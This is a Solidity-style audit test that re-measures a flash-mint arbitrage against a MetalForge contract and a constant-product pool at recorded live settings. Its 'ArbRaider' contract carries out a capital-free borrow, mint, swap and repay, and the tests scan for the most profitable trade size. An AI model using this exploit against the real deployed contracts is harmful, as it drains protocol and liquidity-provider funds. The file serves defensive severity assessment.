// SPDX-License-Identifier: MIT
//
// RE-MEASUREMENT: FlashMint -> MetalForge.mintMetal -> dump into a REAL Pool.
//
// Verified live config (MetalForge 0x1cc5bad32dc8667878fa7c53cc5cfd6e76fdb113):
//   isSupportedPayToken[USDST] = true
//   GOLDST: isEnabled true, feeBps 200, mintCap 1,500e18, totalMinted 6.4573e18
//           -> headroom 1,493.5427e18 GOLDST
//   oracle (push) GOLDST = $4,595.51
// Sale venue: the real Pool (v2 CPMM) 0x...101b, 53.7178 GOLDST / 239,375.75 USDST,
//   swapFeeRate 30 bps, lpSharePercent 7000 (PoolFactory defaults, identical to mainnet).
// FlashMint maxLoan 2,000,000e18.
//
// Supersedes the idealised infinite-depth desk in Adv_Peg_ForgeVault.it_f2, which used
// feeBps 0 and no price impact and therefore overstated the profit by ~3 orders of magnitude.

import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../concrete/Tokens/Token.sol";
import "../../concrete/Metals/MetalForge.sol";
import "../../concrete/Pools/Pool.sol";
import "../../concrete/Flash/FlashMint.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        return address(a).call(f, args);
    }
}

/// @notice flash mint -> mintMetal -> swap GOLDST->USDST in the real pool -> repay.
contract ArbRaider {
    FlashMint public lender;
    MetalForge public forge;
    Pool public pool;
    address public usdst;
    address public gold;

    uint public goldMinted;
    uint public proceeds;
    uint public kept;
    uint public notional;

    function init(address _lender, address _forge, address _pool, address _usdst, address _gold) public {
        lender = FlashMint(_lender);
        forge = MetalForge(_forge);
        pool = Pool(_pool);
        usdst = _usdst;
        gold = _gold;
    }

    function run(uint amount) public {
        notional = amount;
        goldMinted = 0;
        proceeds = 0;
        lender.flashLoan(address(this), amount, "arb");
        kept = IERC20(usdst).balanceOf(address(this));
    }

    function onFlashMint(address _token, uint amount, uint fee, variadic data) external returns (string) {
        require(msg.sender == address(lender), "raider: bad lender");

        IERC20(usdst).approve(address(forge), amount);
        uint g0 = IERC20(gold).balanceOf(address(this));
        forge.mintMetal(gold, usdst, amount, 0);
        goldMinted = IERC20(gold).balanceOf(address(this)) - g0;

        IERC20(gold).approve(address(pool), goldMinted);
        uint u0 = IERC20(usdst).balanceOf(address(this));
        pool.swap(true, goldMinted, 1, block.timestamp + 3600);
        proceeds = IERC20(usdst).balanceOf(address(this)) - u0;

        return "FlashMint.onFlashMint";
    }
}

contract Describe_Adv_Peg_ForgeArb is Authorizable {

    uint public INFINITY = 2 ** 256 - 1;
    uint public WAD = 1e18;
    uint public MAXLOAN = 2000000e18;

    // verified mainnet magnitudes
    uint public POOL_G      = 537178e14;      // 53.7178 GOLDST
    uint public POOL_U      = 23937575e16;    // 239,375.75 USDST
    uint public ORACLE_BASE = 459551e16;      // $4,595.51
    uint public FORGE_FEE   = 200;            // 200 bps
    uint public MINT_CAP    = 1500e18;
    uint public PREMINTED   = 64573e14;       // 6.4573 GOLDST already minted
    uint public SWAP_FEE    = 30;             // 30 bps

    Mercata m;
    FlashMint fm;
    MetalForge forge;
    Pool pool;
    AdminRegistry areg;
    PriceOracle oracle;
    Token USDST;
    Token GOLDST;
    User treasurer;

    uint public poolPrice;      // U/G, WAD
    uint public headroom;       // GOLDST still mintable

    function beforeAll() public {
        bypassAuthorizations = true;
        m = new Mercata();
        areg = m.adminRegistry();
        oracle = m.priceOracle();

        USDST = Token(m.tokenFactory().createToken("USDST","USD Stable",[],[],[],"USDST",0,18));
        USDST.setStatus(2);
        oracle.setAssetPrice(address(USDST), 1e18);

        // ── MetalForge at the VERIFIED live config
        treasurer = new User();
        forge = new MetalForge(address(this));
        forge.initialize(address(oracle), address(treasurer), address(m.feeCollector()), address(USDST));
        forge.setPayToken(address(USDST), true);

        // ── FlashMint
        fm = new FlashMint(address(areg));
        areg.addWhitelist(address(USDST), "mint", address(fm));
        areg.addWhitelist(address(USDST), "burn", address(fm));
        fm.initialize(address(USDST), address(m.feeCollector()), MAXLOAN);
        fm.setWhitelistEnabled(false);

        poolPrice = (POOL_U * WAD) / POOL_G;
        _freshVenue();

        log("── fixture at VERIFIED live config ──");
        log("forge feeBps                = " + string(FORGE_FEE));
        log("forge mintCap               = " + string(MINT_CAP));
        log("forge totalMinted           = " + string(forge.totalMinted(address(GOLDST))));
        log("forge headroom (GOLDST)     = " + string(headroom));
        log("pool reserves GOLDST        = " + string(pool.tokenABalance()));
        log("pool reserves USDST         = " + string(pool.tokenBBalance()));
        log("pool implied price          = " + string(poolPrice));
        log("pool swapFeeRate (bps)      = " + string(pool.poolFactory().swapFeeRate()));
        log("push oracle GOLDST          = " + string(ORACLE_BASE));
        log("pool vs oracle              = pool is BELOW oracle by " + string(((ORACLE_BASE - poolPrice) * 10000) / ORACLE_BASE) + " bps (wrong side)");
        log("maxLoan                     = " + string(MAXLOAN));
    }

    /// Every test gets a virgin metal token + pool at the exact live reserves, so no test's
    /// real swap contaminates the next one's price impact measurement.
    function _freshVenue() internal {
        GOLDST = Token(m.tokenFactory().createToken("GOLDST","Gold",[],[],[],"GOLDST",0,18));
        GOLDST.setStatus(2);
        oracle.setAssetPrice(address(GOLDST), ORACLE_BASE);
        forge.setMetalConfig(address(GOLDST), true, MINT_CAP, FORGE_FEE);
        areg.addWhitelist(address(GOLDST), "mint", address(forge));

        // reproduce totalMinted 6.4573e18 through the forge itself
        uint prePay = (PREMINTED * ORACLE_BASE) / (WAD - (WAD * FORGE_FEE) / 10000);
        User seeder = new User();
        USDST.mint(address(seeder), prePay + 1e18);
        seeder.do(address(USDST), "approve", address(forge), INFINITY);
        seeder.do(address(forge), "mintMetal", address(GOLDST), address(USDST), prePay, 0);
        headroom = MINT_CAP - forge.totalMinted(address(GOLDST));

        // the real Pool, seeded to the live reserves
        pool = Pool(m.poolFactory().createPool(address(GOLDST), address(USDST)));
        Token lpToken = pool.lpToken();
        areg.addWhitelist(address(lpToken), "mint", address(pool));
        areg.addWhitelist(address(lpToken), "burn", address(pool));
        GOLDST.mint(address(this), POOL_G);
        USDST.mint(address(this), POOL_U);
        IERC20(address(GOLDST)).approve(address(pool), POOL_G);
        IERC20(address(USDST)).approve(address(pool), POOL_U);
        // addLiquidity(tokenBAmount = USDST, maxTokenAAmount = GOLDST, deadline)
        pool.addLiquidity(POOL_U, POOL_G, block.timestamp + 3600);
        require(pool.tokenABalance() == POOL_G && pool.tokenBBalance() == POOL_U, "pristine reserves");
    }

    function beforeEach() public {
        _freshVenue();
    }

    // ── pure replica of forge+pool math, used to scan notionals without spending gas on execution
    function _quote(uint payAmount, uint G, uint U, uint Po) internal view returns (uint profit) {
        uint mintFee = (payAmount * FORGE_FEE) / 10000;
        uint principal = payAmount - mintFee;
        uint g = (principal * WAD) / Po;
        if (g == 0) return 0;
        if (g > headroom) return 0;                       // mintCap binds
        uint swapFee = (g * SWAP_FEE) / 10000;
        uint net = g - swapFee;
        uint out = (net * U) / (G + net);
        if (out <= payAmount) return 0;
        return out - payAmount;
    }

    /// coarse geometric scan then a linear refine; returns the profit-maximising notional
    function _best(uint G, uint U, uint Po) internal view returns (uint bestX, uint bestP) {
        bestX = 0;
        bestP = 0;
        uint x = 1e18;
        uint i = 0;
        while (i < 22) {
            uint p = _quote(x, G, U, Po);
            if (p > bestP) { bestP = p; bestX = x; }
            x = x * 2;
            i = i + 1;
        }
        if (bestX == 0) return (0, 0);
        uint lo = bestX / 2;
        uint step = (bestX * 3) / 80;
        if (step == 0) step = 1;
        uint j = 0;
        while (j < 40) {
            uint xx = lo + step * j;
            uint p2 = _quote(xx, G, U, Po);
            if (p2 > bestP) { bestP = p2; bestX = xx; }
            j = j + 1;
        }
        return (bestX, bestP);
    }

    /// oracle that puts the pool `divWad` above it: oracle = poolPrice / (1 + div)
    function _oracleFor(uint divWad) internal view returns (uint) {
        return (poolPrice * WAD) / (WAD + divWad);
    }

    // ─────────────────────────────────────────────────────────────────────
    // (a) minimum divergence at which the round trip is net positive at all
    // ─────────────────────────────────────────────────────────────────────

    function it_g1_minimum_profitable_divergence() public {
        uint G = pool.tokenABalance();
        uint U = pool.tokenBBalance();

        // closed form: profitable only if 0.997 * 0.98 * (Pp/Po) > 1
        //   -> Pp/Po > 1 / (0.997*0.98) = 1.023476...
        uint breakeven = (WAD * 10000 * 10000) / ((10000 - SWAP_FEE) * (10000 - FORGE_FEE));
        log("── g1 breakeven divergence ──");
        log("1/((1-0.003)(1-0.02))       = " + string(breakeven) + " (WAD)");
        log("=> pool must sit           >= " + string(((breakeven - WAD) * 10000) / WAD) + " bps ABOVE the push oracle");

        // empirical scan
        uint[] divs = [0, 10000000000000000, 20000000000000000, 23000000000000000,
                       24000000000000000, 25000000000000000, 30000000000000000,
                       50000000000000000, 100000000000000000, 200000000000000000];
        uint firstProfitable = 0;
        for (uint k = 0; k < divs.length; k++) {
            uint Po = _oracleFor(divs[k]);
            (uint bx, uint bp) = _best(G, U, Po);
            log("div " + string((divs[k] * 10000) / WAD) + " bps  -> bestNotional " + string(bx / WAD) + " USDST, profit " + string(bp) + " wei");
            if (bp > 0 && firstProfitable == 0) firstProfitable = divs[k];
        }
        log("first profitable divergence = " + string((firstProfitable * 10000) / WAD) + " bps");
        (uint px0, uint pp0) = _best(G, U, _oracleFor(0));
        (uint px2, uint pp2) = _best(G, U, _oracleFor(20000000000000000));
        require(pp0 == 0, "at parity there is no profitable size");
        require(pp2 == 0, "at +2.00% still unprofitable");
        require(firstProfitable >= 23000000000000000, "threshold is >= 2.30%, i.e. the 2%+0.3% fee floor");
        require(firstProfitable <= 25000000000000000, "and <= 2.50%");

        // mainnet is on the WRONG side right now: pool 3.05% BELOW oracle
        (uint bxLive, uint bpLive) = _best(G, U, ORACLE_BASE);
        log("at the LIVE oracle 4595.51 (pool 3.05% below): best profit = " + string(bpLive) + " wei");
        require(bpLive == 0, "not live today: needs a >5.1% relative swing first");
    }

    // ─────────────────────────────────────────────────────────────────────
    // (b) profit-maximising notional and max profit at +5% and +10%
    // ─────────────────────────────────────────────────────────────────────

    function it_g2_max_profit_at_plus_5_percent() public {
        uint G = pool.tokenABalance();
        uint U = pool.tokenBBalance();
        uint Po = _oracleFor(50000000000000000);   // pool 5% over oracle
        oracle.setAssetPrice(address(GOLDST), Po);

        (uint bestX, uint bestP) = _best(G, U, Po);

        log("── g2 pool +5% over oracle ──");
        log("push oracle                 = " + string(Po));
        log("pool price                  = " + string(poolPrice));
        log("profit-max notional         = " + string(bestX) + " wei (" + string(bestX / WAD) + " USDST)");
        log("quoted profit               = " + string(bestP) + " wei (" + string(bestP / WAD) + " USDST)");
        log("notional as % of maxLoan    = " + string((bestX * 10000) / MAXLOAN) + " bps");

        // EXECUTE it for real
        ArbRaider r = new ArbRaider();
        r.init(address(fm), address(forge), address(pool), address(USDST), address(GOLDST));
        r.run(bestX);

        log("executed: GOLDST minted     = " + string(r.goldMinted()));
        log("executed: USDST proceeds    = " + string(r.proceeds()));
        log("executed: profit kept       = " + string(r.kept()) + " wei (" + string(r.kept() / WAD) + " USDST)");
        log("attacker capital required   = 0");
        require(r.kept() > 0, "DEMONSTRATED: capital-free but small");
        require(r.kept() == bestP, "execution matches the quote exactly");
        require(r.kept() < 100e18, "MAX PROFIT AT +5% IS UNDER $100, NOT thousands");

        oracle.setAssetPrice(address(GOLDST), ORACLE_BASE);
    }

    function it_g3_max_profit_at_plus_10_percent() public {
        uint G = pool.tokenABalance();
        uint U = pool.tokenBBalance();
        uint Po = _oracleFor(100000000000000000);   // pool 10% over oracle
        oracle.setAssetPrice(address(GOLDST), Po);

        (uint bestX, uint bestP) = _best(G, U, Po);

        log("── g3 pool +10% over oracle ──");
        log("push oracle                 = " + string(Po));
        log("profit-max notional         = " + string(bestX) + " wei (" + string(bestX / WAD) + " USDST)");
        log("quoted profit               = " + string(bestP) + " wei (" + string(bestP / WAD) + " USDST)");
        log("notional as % of maxLoan    = " + string((bestX * 10000) / MAXLOAN) + " bps");

        ArbRaider r = new ArbRaider();
        r.init(address(fm), address(forge), address(pool), address(USDST), address(GOLDST));
        r.run(bestX);

        log("executed: GOLDST minted     = " + string(r.goldMinted()));
        log("executed: USDST proceeds    = " + string(r.proceeds()));
        log("executed: profit kept       = " + string(r.kept()) + " wei (" + string(r.kept() / WAD) + " USDST)");
        require(r.kept() > 0, "DEMONSTRATED at +10%");
        require(r.kept() == bestP, "execution matches the quote exactly");
        require(r.kept() < 1000e18, "MAX PROFIT AT +10% IS UNDER $1,000, NOT $199,999");

        // and prove the maximum really is a maximum: 10x the optimal notional loses money
        uint over = bestX * 10;
        log("quote at 10x the optimum    = " + string(_quote(over, G, U, Po)) + " wei (price impact has eaten it)");
        require(_quote(over, G, U, Po) == 0, "oversizing turns the trade negative");

        oracle.setAssetPrice(address(GOLDST), ORACLE_BASE);
    }

    // ─────────────────────────────────────────────────────────────────────
    // (c) binding constraint at a 2,000,000 maxLoan
    // ─────────────────────────────────────────────────────────────────────

    function it_g4_pool_depth_binds_three_orders_below_mintcap_and_maxloan() public {
        uint G = pool.tokenABalance();
        uint U = pool.tokenBBalance();
        uint Po = _oracleFor(100000000000000000);
        oracle.setAssetPrice(address(GOLDST), Po);

        // USDST needed to consume the whole 1,493.5427 GOLDST headroom
        uint usdstToHitCap = (headroom * Po) / (WAD - (WAD * FORGE_FEE) / 10000);
        (uint bestX, uint bestP) = _best(G, U, Po);

        log("── g4 which constraint binds ──");
        log("forge headroom (GOLDST)     = " + string(headroom));
        log("USDST needed to hit mintCap = " + string(usdstToHitCap / WAD));
        log("flashMint maxLoan           = " + string(MAXLOAN / WAD));
        log("profit-max notional         = " + string(bestX / WAD));
        log("pool USDST depth            = " + string(U / WAD));

        require(usdstToHitCap > MAXLOAN, "mintCap headroom exceeds maxLoan: maxLoan binds before mintCap");
        require(bestX * 100 < MAXLOAN, "but the optimum is >100x below maxLoan");
        log("=> BINDING CONSTRAINT IS POOL DEPTH / PRICE IMPACT, not mintCap and not maxLoan.");
        log("   optimum is " + string(MAXLOAN / bestX) + "x below maxLoan and " + string(usdstToHitCap / bestX) + "x below the mintCap notional.");

        // what a full 2,000,000 flash mint actually does here
        ArbRaider r = new ArbRaider();
        r.init(address(fm), address(forge), address(pool), address(USDST), address(GOLDST));
        string err = "";
        try r.run(MAXLOAN) { } catch Error(string e) { err = e; }
        log("running the FULL 2,000,000 notional -> " + err);
        require(err != "", "a maxLoan-sized trade cannot repay: price impact destroys it");

        // and the same at the cap-limited size
        ArbRaider r2 = new ArbRaider();
        r2.init(address(fm), address(forge), address(pool), address(USDST), address(GOLDST));
        string err2 = "";
        try r2.run(1000000e18) { } catch Error(string e) { err2 = e; }
        log("running 1,000,000 notional        -> " + err2);
        require(err2 != "", "1,000,000 also unrepayable");

        oracle.setAssetPrice(address(GOLDST), ORACLE_BASE);
    }
}
